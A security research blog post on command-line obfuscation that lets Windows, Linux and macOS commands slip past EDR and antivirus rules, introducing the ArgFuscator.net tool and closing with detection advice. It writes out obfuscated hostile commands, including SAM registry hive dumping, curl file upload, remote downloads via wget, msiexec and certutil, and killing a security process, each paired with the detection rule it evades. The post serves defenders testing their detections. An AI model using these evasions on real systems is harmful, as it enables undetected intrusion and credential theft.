# https://www.wietzebeukema.nl/blog/bypassing-detections-with-command-line-obfuscation

## EDRs ❤️ Command-Line Arguments

Command-line arguments are weird, I have argued in earlier posts \[ [1](https://www.wietzebeukema.nl/blog/windows-command-line-obfuscation), [2](https://www.wietzebeukema.nl/blog/why-bother-with-argv0)\]. Being a key concept in computing, where a program is given some initial input when starting a new process, it is also a principal source for identifying malicious behaviour: defensive software such as AV​s and EDR​s analyse all processes’ command lines for possible threat actor activity.

This may be surprising to some, as computer defenses traditionally used to focus on the identification of malicious executables: historically via malware signatures, later assisted by malware heuristics.

As of 2025, this approach no longer suffices. An ongoing trend that began more than five years ago has shown a surge in so-called ‘malwareless intrusions’ \[ [3](https://doi.org/10.5815/ijcnis.2017.07.01)\]. This is defined as a successful compromise where no malicious binaries were involved. Instead, threat actors resort in such attacks to:

1. **System-native scripting languages**, such as PowerShell on Windows or bash on Linux and macOS;
2. **System-native executables**, also known as _Living-of-the-Land binaries_ or LOLBINs \[ [4](https://lolbas-project.github.io/)\]; and,
3. **Legitimate/trusted third-party executables**, for example, remote management and monitoring software such as TeamViewer and AnyDesk.

In 2024, well over 3 in every 4 intrusions observed by cyber security firm CrowdStrike was fully malwareless \[ [5](https://www.crowdstrike.com/en-us/global-threat-report/)\]. From an attacker standpoint, this shift is easily explained: why invest in writing complicated malware when other, trusted tools can achieve the same? It typically requires less skill; and perhaps most crucially, the chances of getting detected may be lower as well, since distinguishing legitimate from malicious use can be hard.

Consider for example `taskkill` on Windows or `kill` on Linux and macOS. Designed to terminate running processes, this legitimate and trusted executable is present in virtually all OS versions, and its file hash is highly unlikely to be blocked by defensive software. As such, the risk of getting detected when killing a process via this system-native utility is lower than when doing so from a malware binary, as the latter is more likely to set off alarm bells: unknown/low-prevalence programs invoking system calls to terminate other (system) processes is suspicious in itself, after all. Instead, the former is likely to blend in better with benign usage of the tool.

In response to this, security solutions have become increasingly concerned about whether the _behaviour_ of a program is benign or malicious. Although there are many ways in which this can be achieved, a simple, low-hanging-fruit way of achieving this is analysing command-line arguments to understand the _intent_ of a program execution. Ultimately, command lines are highly valuable in assessing this: for example, `taskkill /f /im winword.exe` has a very different risk profile than `taskkill /f /im security_process.exe` \[ [6](https://github.com/SigmaHQ/sigma/blob/598d29f811c1859ba18e05b8c419cc94410c9a55/rules/windows/process_creation/proc_creation_win_taskkill_sep.yml#L22-L26)\].

## Threat Actors 🥸 Command-Line Arguments

To counter this, threat actors have been observed \[ [7](https://x.com/cyb3rops/status/1029818856557215744)\] to avoid such command-line detections by tweaking what command-line arguments they use. This technique, better known as command-line obfuscation \[ [8](https://attack.mitre.org/techniques/T1027/010/)\], is an attempt to masquerade the true intention of a command with the ultimate goal of bypassing threat detection or misleading an analyst.

Command-line obfuscation is different from other types of command obfuscation such as DOSfuscation or PowerShell obfuscation \[ [9](https://services.google.com/fh/files/misc/exploring-the-depths-of-cmd-exe-obfuscation-wp-en.pdf), [10](https://github.com/danielbohannon/Invoke-Obfuscation)\] in that it is not shell dependent: it is the target executable that is vulnerable, and therefore it does not matter in what context the process creation happens. As a result, another key difference is that the obfuscated command line is passed on **fully obfuscated** to an EDR, whereas e.g. DOSfuscation techniques starting new processes typically result in resolved, unobfuscated command lines.

[![Screenshot showing DOSfuscation successfully obfuscating a command, but with the certutil execution ultimately showing up in unobfuscated form in ProcMon.](https://www.wietzebeukema.nl/assets/2025-03-24-dosfuscation.jpg)](https://www.wietzebeukema.nl/assets/2025-03-24-dosfuscation.jpg)_Screenshot showing DOSfuscation \[ [9](https://services.google.com/fh/files/misc/exploring-the-depths-of-cmd-exe-obfuscation-wp-en.pdf)\] successfully obfuscating a command, but with the `certutil` execution ultimately showing up in unobfuscated form in ProcMon \[ [24](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)\]._

This means that command-line obfuscation may, unlike the other obfuscation types, have a higher success rate in bypassing defensive measures. Command-line obfuscation can take many forms; sometimes, techniques are applied in isolation, while other times, multiple techniques are combined. To bring the concept of command-line obfuscation to live, consider the following examples:

### Windows

In an earlier blog post \[ [1](https://www.wietzebeukema.nl/blog/windows-command-line-obfuscation)\], I set out various techniques for Windows in which this can be achieved, including:

- **Option character substitution**:

  `taskkill -f -im ccSvcHst.exe` instead of `taskkill /f /im ccSvcHst.exe`, bypassing e.g. \[ [6](https://github.com/SigmaHQ/sigma/blob/598d29f811c1859ba18e05b8c419cc94410c9a55/rules/windows/process_creation/proc_creation_win_taskkill_sep.yml#L22-L26)\],
- **Character substitution**: `reg eˣport HKLM\SAM out.reg`, bypassing e.g. \[ [11](https://github.com/SigmaHQ/sigma/blob/3ce034bb201fda14a391f1ad9111340b8dbea428/deprecated/windows/proc_creation_win_credential_acquisition_registry_hive_dumping.yml#L23)\],
- **Character insertion**: `reg sa⚽ve HKLM\SAM out.reg`, bypassing e.g. \[ [12](https://github.com/elastic/detection-rules/blob/c0f12ddecfb02ecf36e0efff14d2cd21e823fa61/rules/windows/credential_access_dump_registry_hives.toml#L93)\],
- **Quotes insertion**: `reg "s"a"v"e H"KL"M\S"AM" out.reg`, bypassing e.g. \[ [13](https://github.com/splunk/security_content/blob/bee2a4cefa533f286c546cbe6798a0b5dec3e5ef/detections/endpoint/attempted_credential_dump_from_registry_via_reg_exe.yml#L13)\]; and,
- **Character deletion**: `powershell -en …` instead of `powershell -encodedcommand …`, bypassing e.g. \[ [14](https://github.com/reprise99/Sentinel-Queries/blob/3102a56d0f081441a0b73c906ceed227fa93701b/Defender%20for%20Endpoint/Device-DetectEncodedPowershellandDecode.kql#L8-L11)\].

Additional techniques include:

- **Value transformations**: `ping 2130706433` instead of `ping 127.0.0.1`, bypassing e.g. \[ [15](https://github.com/SigmaHQ/sigma/blob/3ce034bb201fda14a391f1ad9111340b8dbea428/rules-emerging-threats/2019/Malware/QBot/proc_creation_win_malware_qbot.yml#L23)\],
- **Path traversal**: `mshta c:\windows\system32\..\temp\evil.hta`, bypassing e.g. \[ [16](https://github.com/SigmaHQ/sigma/blob/598d29f811c1859ba18e05b8c419cc94410c9a55/rules/windows/process_creation/proc_creation_win_mshta_susp_pattern.yml#L37)\]; and,
- **URL manipulation**: `msiexec https:\\example.org/install.msi` instead of using `https://`, bypassing e.g. \[ [17](https://github.com/splunk/security_content/blob/76a9a02c9e7826721e8867d5838c84a7768d068c/detections/endpoint/windows_msiexec_remote_download.yml#L19-L24)\].

[![Screenshot demonstrating that command-line obfuscation shows in obfuscated form in ProcMon, unlike DOSfuscation.](https://www.wietzebeukema.nl/assets/2025-03-24-argfuscation.jpg)](https://www.wietzebeukema.nl/assets/2025-03-24-argfuscation.jpg)_Screenshot demonstrating that command-line obfuscation of `certutil` shows in obfuscated form in ProcMon, unlike DOSfuscation._

### Linux and macOS

Although less ‘wild’ than Windows, \*nix-based operating systems offer their own type obfuscation opportunities:

- **Character deletion**: `curl --upload-f file.txt example.org` instead of `--upload-file`, bypassing e.g. \[ [18](https://github.com/splunk/security_content/blob/fdaa038eab70c41517d8e8290c4f522154b7e238/detections/endpoint/linux_curl_upload_file.yml#L18-L25)\],
- **Option reordering/stuffing**: `bash -lc …` instead of `bash -c …` or `bash -c -l …`, bypassing e.g. \[ [19](https://github.com/elastic/detection-rules/blob/059d7efa25adab2f2c43b87efca9bfaad887aaa7/rules/linux/command_and_control_ip_forwarding_activity.toml#L78)\],
- **Option separator insertion**: `wget -O - example.org` instead of `wget -O- example.org`, bypassing e.g. \[ [20](https://github.com/splunk/security_content/blob/fdaa038eab70c41517d8e8290c4f522154b7e238/detections/endpoint/wget_download_and_bash_execution.yml#L23)\],
- **Option separator deletion**: `osascript -e"log 'hi'"` instead of `osascript -e "log 'hi'"`, bypassing e.g. \[ [21](https://github.com/SigmaHQ/sigma/blob/598d29f811c1859ba18e05b8c419cc94410c9a55/rules/macos/process_creation/proc_creation_macos_applescript.yml#L21)\]
- **Value transformation**: `wget https://0177.0.0.0x1` instead of `wget https://127.0.0.1` , bypassing e.g. \[ [22](https://github.com/SigmaHQ/sigma/blob/78a78c79ffd2998cd864618c538395a4e8c23902/rules-emerging-threats/2023/TA/UNC4841-Barracuda-ESG-Zero-Day-Exploitation/proc_creation_lnx_apt_unc4841_wget_download_tar_files_direct_ip.yml#L19)\].

## Identifying command-line obfuscation opportunities

The above examples show that many executables are vulnerable to command-line obfuscation. However, whether an executable is vulnerable and to which specific obfuscation techniques differs executable to executable. Especially on Windows, previous research \[ [23](https://blog.orange.tw/posts/2025-01-worstfit-unveiling-hidden-transformers-in-windows-ansi/)\] has attempted to shine some light on why certain executables exhibit certain behaviours; in true Microsoft fashion, most of this seems to be attributable to keeping executables backwards compatible between changes in Windows and the Windows API. That said, based on my own testing, there did not appear to be any consistency with how command-line obfuscation techniques could be applied to different Windows programs.

Therefore, to understand the full scale of the problem command-line obfuscation imposes, other executables were tested for their susceptibility to the listed obfuscation techniques.

![Flowchart of the taken approach.](https://www.wietzebeukema.nl/assets/2025-03-24-methodology.svg)

First, an application is selected for investigation. For this research, it was decided to focus on commonly used Windows 11 LOLBINs as found in the LOLBAS Project \[ [4](https://lolbas-project.github.io/)\] and Atomic Red Team \[ [28](https://www.atomicredteam.io/)\], which resulted in a list of 68 Windows executables. The next step is to investigate their susceptibility to the different types of command-line obfuscation that were identified earlier. As a significant portion of this can be automated, the Python module `analyse_obfuscation` \[ [29](https://github.com/wietze/windows-command-line-obfuscation)\] was used for this: it runs a given command line thousands of times in parallel with various obfuscation options applied, validating whether the exit code and output on the stdout are the same as the original version. The module provides a textual output with found command lines that are deemed to be synonymous.

Based on these observations, a model file is constructed to define the available obfuscation options, their application order, and the command-line argument types they affect. For example, the previous step may have identified that `reg eˣport HKLM\SAM example.reg` is a valid command; however, that does not mean that _any_ x can be replaced by ˣ. For example, `reg export HKLM\SAM eˣample.reg` will create a file called `eˣample.reg` (i.e., the unicode character is preserved) instead of `example.reg`, and is therefore not synonymous. Thus, our model file specifies that character substitution is available, but should only applied to regular command line arguments, and not to e.g. file paths or URLs.

```
{
    "tokens": [{"command": "reg"}, {"argument": "export"}, {"reg_path": "HKLM\\SAM"}, {"file_path": "example.reg"}],
    "modifiers": {
        "CharacterSubstitution": {
            "Mapping": {"a": "ᵃ", "b": "ᵇ", "c": "ᶜ", "d": "ᵈ", "e": "ᵉ", "f": "ᶠ", "g": "ᵍ", "h": "ʰ", "j": "ʲ", "k": "ᵏ", "l": "ˡ", "m": "ᵐ", "n": "ⁿ", "o": "ᵒ", "p": "ᵖ", "r": "ʳ", "s": "ˢ", "t": "ᵗ", "u": "ᵘ", "v": "ⱽ", "w": "ʷ", "x": "ˣ", "y": "ʸ", "z": "ᶻ"},
            "AppliesTo": ["argument"]
        },
        "RandomCase": {
            "AppliesTo": ["argument", "file_path", "command"]
        },
        "OptionCharacterSubstitution": {
            "OptionChars": ["-", "/", "\ufe63"],
            "AppliesTo": ["argument"]
        },
        "CharacterInsertion": {
            "Characters": ["\u00ad", "\u034f", "\u0378", …],
            "AppliesTo": ["argument"]
        },
        "QuoteInsertion": {
            "AppliesTo": ["argument", "file_path", "url"]
        }
    }
}
```

_A simplified version of the model files used, in JSON format._

As can be seen in the example above, the model file first (see `tokens`) specifies a tokenised version of command-line arguments and assigns them their appropriate type. Then (see `modifiers`) all command-line obfuscation options are defined with all their relevant parameters, including which command-line argument types they apply to.

The fourth step is to test whether this model as defined is now an accurate representation of the command-line obfuscation options available. To do so, the model file is used to _generate_ an obfuscated command line. Even more interestingly, multiple obfuscation techniques are applied at once, by sequentially applying the specified modifiers with a certain probability. As such, the given example model file may result in `reg eˣPOʳT HK"L"M\SA"M" EX"a"m"PLE.reg"`, `Reg ᵉ෵዆୓ᷯxp᫘ꬽᵒ⹼R൚ꭂT HKL"M\S"AM ExaMPle.rEG`, `rEg ᵉꮘXpOʳꞘᵗ஢ HK"L"M\SAM eX"amPLe.R"eG`, and so on.

[![Screenshot of the three described reg.exe obfuscation examples in action on a Windows 11 machine.](https://www.wietzebeukema.nl/assets/2025-03-24-reg.jpg)](https://www.wietzebeukema.nl/assets/2025-03-24-reg.jpg)_Screenshot of the three described `reg.exe` obfuscation examples in action on a Windows 11 machine._

Although this can be done manually, the machine-readable model files allow us to automate this too. For the purposes of this research, _Invoke-ArgFuscation_ \[ [30](https://github.com/wietze/Invoke-ArgFuscator)\] was written: a cross-platform PowerShell module that takes model files and generates obfuscated command-line arguments following the provided definition. The probability of applying each step, which can be controlled in the model file itself, means that the output is highly likely to be different every time. Wrapping _Invoke-ArgFuscator_ in minimal PowerShell code allows for the execution of the generated command lines, and validation of the exit code and standard out. Any command lines generating an unexpected output should be assessed, and likely result in adjustments of the model file that generated it. If after a high number of generations the output is consistently as expected (in this research, n=1000 was used), the model file is considered an accurate representation of reality, resulting in the abstraction we were after.

[![Screenshot of Invoke-ArgFuscator in action, generating 20 obfuscated versions of our reg.exe command.](https://www.wietzebeukema.nl/assets/2025-03-24-invoke-argfuscator.jpg)](https://www.wietzebeukema.nl/assets/2025-03-24-invoke-argfuscator.jpg)_Screenshot of Invoke-ArgFuscator \[ [30](https://github.com/wietze/Invoke-ArgFuscator)\] in action, generating 20 obfuscated versions of our `reg.exe` command._

## Findings: a new platform, ArgFuscator.net 🚀

Having applied this approach to 68 Windows executables resulted in an equal amount of model files, that have been validated against Windows 11 23H2. The executables in question are `addinutil`, `adfind`, `arp`, `aspnet_compiler`, `at`, `auditpol`, `bcdedit`, `bitsadmin`, `cacls`, `certreq`, `certutil`, `cipher`, `cmdkey`, `cmstp`, `csc`, `cscript`, `curl`, `dism`, `driverquery`, `expand`, `extrac32`, `findstr`, `fltmc`, `forfiles`, `fsutil`, `ftp`, `icacls`, `ipconfig`, `jsc`, `makecab`, `msbuild`, `msiexec`, `nbtstat`, `net` (and `net1`), `netsh`, `netstat`, `nltest`, `nslookup`, `ping`, `pnputil`, `powershell` (and `pwsh`), `procdump`, `psexec`, `query`, `reg`, `regedit`, `regsvr32`, `robocopy`, `route`, `rpcping`, `runas`, `sc`, `schtasks`, `secedit`, `takeown`, `tar`, `taskkill`, `tasklist`, `vaultcmd`, `vbc`, `w32tm`, `wevtutil`, `where`, `whoami`, `winget`, `wmic`, `wscript`, and `xcopy`.

With the introduction of _ArgFuscator.net_ \[ [31](https://argfuscator.net/)\], all results are now accessible for those interested in command-line obfuscation. For defenders, it is a rich resource outlining command-line obfuscation options to be aware of when writing detection content. Every executable assessed as part of this research has their own dedicated page \[ [32](https://github.com/wietze/ArgFuscator.net/)\], specifying the types of command-line obfuscation as well as their parameters.

The project doesn’t stop there: it also offers the option to obfuscate a user-given command line, using the findings of this research. For any of the 68 supported executables, simply pasting in a command one wishes to obfuscate and clicking “Apply obfuscation” will generate a synonymous command line that according to our research will work as well. The website comes with an advanced editor that allows users to disable certain obfuscation types, change the probability with which techniques are applied, or even write their own model files.

 (A video demonstrating how a \`certutil.exe\` command attempting to download a file is blocked by Windows Defender, but when obfuscated using \_ArgFuscator.net\_, it works without issue.)

_A video demonstrating how a `certutil.exe` command attempting to download a file \[ [33](https://lolbas-project.github.io/lolbas/Binaries/Certutil/#download)\] is blocked by Windows Defender, but when obfuscated using [ArgFuscator.net](https://argfuscator.net/), it works without issue._

As the above video shows, it offers those in defensive security the opportunity to test, with practical examples, how resilient their detections and defence mechanisms are.

The project is fully open-source \[ [32](https://github.com/wietze/ArgFuscator.net/)\], and the website itself is hosted on GitHub. Although all processing happens entirely within the browser (the obfuscation engine is written in TypeScript) and none of the inputs are logged, it is possible to deploy a self-hosted instance or leverage the previously mentioned Invoke-ArgFuscator \[ [30](https://github.com/wietze/Invoke-ArgFuscator)\] to obfuscate command-line arguments offline. Also note that since this research focussed on Windows, support for Linux and macOS commands has not been added to the platform yet - this is on the roadmap for later this year.

## Prevention and detection

Despite the high number of obfuscation options that are available to many executables, detecting abuse doesn’t have to be hard.

For example, a single detection rule looking for command-line arguments containing characters high up in the Unicode range might be a catch-all for character insertion/substitution obfuscation techniques across all executables. In many environments, this is likely to be rare, especially if you limit the processes of interest to the ones included in this research. Another example is identifying anomalies on the command line, such as detecting a high number of quotes \[ [25](https://www.linkedin.com/posts/0x534c_cybersecurity-argfuscator-kqlobfusguard-activity-7296880904411521024-bWAK)\] or a high variation in upper- and lowercase characters \[ [26](https://twitter.com/mthcht/status/1888605609194295307)\]. Furthermore, as a general recommendation, writing resillient detections is good practice: define detection logic in a way that detect keywords of interest, even when obfuscation is applied. With the launch or ArgFuscator, defenders have a powerful tool that specifies what obfuscation types they should be aware of when writing detections.

From a detection pipeline view, it is also worth normalising command-line arguments prior to evaluating them against detection logic. For example, Windows Defender for Endpoint offers a feature that parses a process’ command line, effectively getting rid of any double quotes that may obstruct keyword detection \[ [27](https://learn.microsoft.com/en-us/kusto/query/parse-command-line-function)\]. It may be even worth flagging command lines where the parsed version deviates highly from the unparsed version.

Finally, a key recommendation is to avoid relying on command-line arguments where possible. For the avoidance of doubt: there is nothing wrong with writing detections that target command-line arguments, as it will successfully identify lots of potentially malicious behaviour. However, as this research and other research has demonstrated, command lines can be spoofed, altered or otherwise manipulated in ways that can bypass detections. Where possible, a more reliable alternative is focussing on other events present in EDR telemetry that cannot easily be spoofed; for example, instead of looking for `msiexec.exe` specifying `https://` on the command line, consider looking for external network connections originating from `msiexec`.

Posted on 2025-03-24

* * *

Twitter Embed

[Visit this post on X](https://twitter.com/Wietze/status/1904097884124971407?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1904097884124971407%7Ctwgr%5E88dc28dbfefbe3e37aad628db952795791709324%7Ctwcon%5Es1_&ref_url=https%3A%2F%2Fwww.wietzebeukema.nl%2Fblog%2Fbypassing-detections-with-command-line-obfuscation)

[![](https://pbs.twimg.com/profile_images/1585190820319268865/FfTaeq3Z_normal.jpg)](https://twitter.com/Wietze?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1904097884124971407%7Ctwgr%5E88dc28dbfefbe3e37aad628db952795791709324%7Ctwcon%5Es1_&ref_url=https%3A%2F%2Fwww.wietzebeukema.nl%2Fblog%2Fbypassing-detections-with-command-line-obfuscation)

[Wietze](https://twitter.com/Wietze?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1904097884124971407%7Ctwgr%5E88dc28dbfefbe3e37aad628db952795791709324%7Ctwcon%5Es1_&ref_url=https%3A%2F%2Fwww.wietzebeukema.nl%2Fblog%2Fbypassing-detections-with-command-line-obfuscation)

[@Wietze](https://twitter.com/Wietze?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1904097884124971407%7Ctwgr%5E88dc28dbfefbe3e37aad628db952795791709324%7Ctwcon%5Es1_&ref_url=https%3A%2F%2Fwww.wietzebeukema.nl%2Fblog%2Fbypassing-detections-with-command-line-obfuscation)

·

[Follow](https://twitter.com/intent/follow?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1904097884124971407%7Ctwgr%5E88dc28dbfefbe3e37aad628db952795791709324%7Ctwcon%5Es1_&ref_url=https%3A%2F%2Fwww.wietzebeukema.nl%2Fblog%2Fbypassing-detections-with-command-line-obfuscation&screen_name=Wietze)

[View on X](https://twitter.com/Wietze/status/1904097884124971407?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1904097884124971407%7Ctwgr%5E88dc28dbfefbe3e37aad628db952795791709324%7Ctwcon%5Es1_&ref_url=https%3A%2F%2Fwww.wietzebeukema.nl%2Fblog%2Fbypassing-detections-with-command-line-obfuscation)

By making minor changes to command-line arguments, it is possible to bypass EDR/AV detections.

My research, comprising ~70 Windows executables, found that all of them were vulnerable to this, to varying degrees.

Here’s what I found and why it matters ![👉](https://abs-0.twimg.com/emoji/v2/svg/1f449.svg)[https://wietze.github.io/blog/bypassing-detections-with-command-line-obfuscation…](https://wietze.github.io/blog/bypassing-detections-with-command-line-obfuscation)

[![Image](https://pbs.twimg.com/media/Gmy2728W8AAIG53?format=jpg&name=small)](https://x.com/Wietze/status/1904097884124971407/photo/1)

[9:08 AM · Mar 24, 2025](https://twitter.com/Wietze/status/1904097884124971407?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1904097884124971407%7Ctwgr%5E88dc28dbfefbe3e37aad628db952795791709324%7Ctwcon%5Es1_&ref_url=https%3A%2F%2Fwww.wietzebeukema.nl%2Fblog%2Fbypassing-detections-with-command-line-obfuscation)

[X Ads info and privacy](https://help.twitter.com/en/twitter-for-websites-ads-info-and-privacy)

[795](https://twitter.com/intent/like?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1904097884124971407%7Ctwgr%5E88dc28dbfefbe3e37aad628db952795791709324%7Ctwcon%5Es1_&ref_url=https%3A%2F%2Fwww.wietzebeukema.nl%2Fblog%2Fbypassing-detections-with-command-line-obfuscation&tweet_id=1904097884124971407) [Reply](https://twitter.com/intent/tweet?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1904097884124971407%7Ctwgr%5E88dc28dbfefbe3e37aad628db952795791709324%7Ctwcon%5Es1_&ref_url=https%3A%2F%2Fwww.wietzebeukema.nl%2Fblog%2Fbypassing-detections-with-command-line-obfuscation&in_reply_to=1904097884124971407)

Copy link

[Read 10 replies](https://twitter.com/Wietze/status/1904097884124971407?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1904097884124971407%7Ctwgr%5E88dc28dbfefbe3e37aad628db952795791709324%7Ctwcon%5Es1_&ref_url=https%3A%2F%2Fwww.wietzebeukema.nl%2Fblog%2Fbypassing-detections-with-command-line-obfuscation)

Twitter Widget Iframe